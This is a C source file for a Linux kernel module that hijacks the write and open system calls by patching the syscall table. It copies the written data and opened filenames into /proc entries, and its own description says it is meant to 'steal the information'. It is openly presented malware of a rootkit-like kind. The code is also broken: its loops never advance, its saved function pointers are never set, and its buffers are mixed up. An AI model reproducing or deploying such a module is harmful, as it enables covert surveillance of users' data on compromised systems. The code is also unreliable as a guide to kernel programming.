/*
** syscall.c for lkm_syscall
**
** Originally made by xsyann
** Contact <contact@xsyann.com>
**
** Current version built by Andrew Cantor & Quinton Hiler
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andrew Cantor & Quinton Hiler");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");


#define SYS_CALL_TABLE "sys_call_table"
#define SYSCALL_NI __NR_write
#define SYSCALL_NA __NR_open


static ulong *syscall_table = NULL;
static void *original_write = NULL;
static void *original_open = NULL;

asmlinkage int (*old_write)(int fildes, const void *buf, size_t nbytes);
asmlinkage int (*old_open)(const char *filename, int flags, int mode);

//Proc File variables
const char proc_file_write[] = "proc_mal_write";
const char proc_file_open[] = "proc_mal_open";
char proc_buffer_write[1000];
int proc_buffer_size_write = 0;
char proc_buffer_open[1000];
int proc_buffer_size_open = 0;

static ssize_t proc_read_write(struct file *fp, char *buf, size_t len, loff_t * off)
{
  //Stops the user from asking for information for forever.
  static int finished=0;
  if(finished) {
    finished = 0;
    return 0;
  }
  finished = 1;
		memcpy(buf, proc_buffer_write, proc_buffer_size_write);

	return proc_buffer_size_write;
}

static ssize_t proc_read_open(struct file *fp, char *buf, size_t len, loff_t * off)
{
  //Stops the user from asking for information for forever.
  static int finished=0;
  if(finished) {
    finished = 0;
    return 0;
  }
  finished = 1;
		memcpy(buf, proc_buffer_open, proc_buffer_size_open);

	return proc_buffer_size_open;
}

static struct file_operations proc_fops_write = {
  .owner= THIS_MODULE,
  .read= proc_read_write
};

static struct file_operations proc_fops_open = {
  .owner= THIS_MODULE,
  .read= proc_read_open
};

static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
{
	void *buffer[nbytes];
 	int steal_dest = fildes;

        if (copy_from_user(buffer, buf, nbytes)) {
                return -EFAULT;
        }

        buffer[nbytes-1] = '\0';
        proc_buffer_size_write = 0;
        int i = 0;
        while (buffer[i] != '\0' && i <1000){
          proc_buffer_write[i] = buffer[i];
        }
        if(i<1000){
          proc_buffer_open[i+1] = steal_dest;
        }
        proc_buffer_size_write = i;
        printk("%s",proc_buffer_write);
        return (*old_write)(fildes, buf, nbytes);
}



static unsigned long new_open(const char *filename, int flags, int mode)

{
	char buffer[100];
	int steal_flags = flags;
	int detect_mode = mode;

        if (copy_from_user(buffer, filename, 100)) {
                return -EFAULT;
        }

        buffer[99] = '\0';
        proc_buffer_size_open = 0;
        int i = 0;
        while (buffer[i] != '\0' && i <1000){
          proc_buffer_open[i] = buffer[i];

        }
        if(i<1000){
          proc_buffer_open[i+1] = steal_flags;
        }
        proc_buffer_size_open = i;
        printk("%s",proc_buffer_open);
        return (*old_open)(filename, flags, mode);
}


static int is_syscall_table(ulong *p)

{
        return ((p != NULL) && (p[__NR_close] == (ulong)ksys_close));
}

static int page_read_write(ulong address)

{
        uint level;
        pte_t *pte = lookup_address(address, &level);

        if(pte->pte &~ _PAGE_RW)
                pte->pte |= _PAGE_RW;

        return 0;
}


static int page_read_only(ulong address)

{
        uint level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~ _PAGE_RW;
        return 0;
}



static void replace_syscall_write(ulong offset, ulong func_address)

{
        syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);

        if (is_syscall_table(syscall_table)) {

                page_read_write((ulong)syscall_table);
                original_write = (void *)(syscall_table[offset]);
                syscall_table[offset] = func_address;
                page_read_only((ulong)syscall_table);
        }
}


static void replace_syscall_open(ulong offset, ulong func_address)

{
        syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);

        if (is_syscall_table(syscall_table)) {

                page_read_write((ulong)syscall_table);
                original_open = (void *)(syscall_table[offset]);
                syscall_table[offset] = func_address;
                page_read_only((ulong)syscall_table);
        }
}



static int init_syscall(void)

{
        proc_create(proc_file_write, 0, NULL, &proc_fops_write);
        proc_create(proc_file_open, 0, NULL, &proc_fops_open);
        replace_syscall_write(SYSCALL_NI, (ulong)new_write);
	      replace_syscall_open(SYSCALL_NA, (ulong)new_open);
        return 0;
}


static void cleanup_syscall(void)

{
        remove_proc_entry(proc_file_write,NULL);
        remove_proc_entry(proc_file_open,NULL);
        page_read_write((ulong)syscall_table);
        syscall_table[SYSCALL_NI] = (ulong)original_write;
	      syscall_table[SYSCALL_NA] = (ulong)original_open;
        page_read_only((ulong)syscall_table);

}


module_init(init_syscall);
module_exit(cleanup_syscall);

MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module hijack both close() and write() and steal the information");
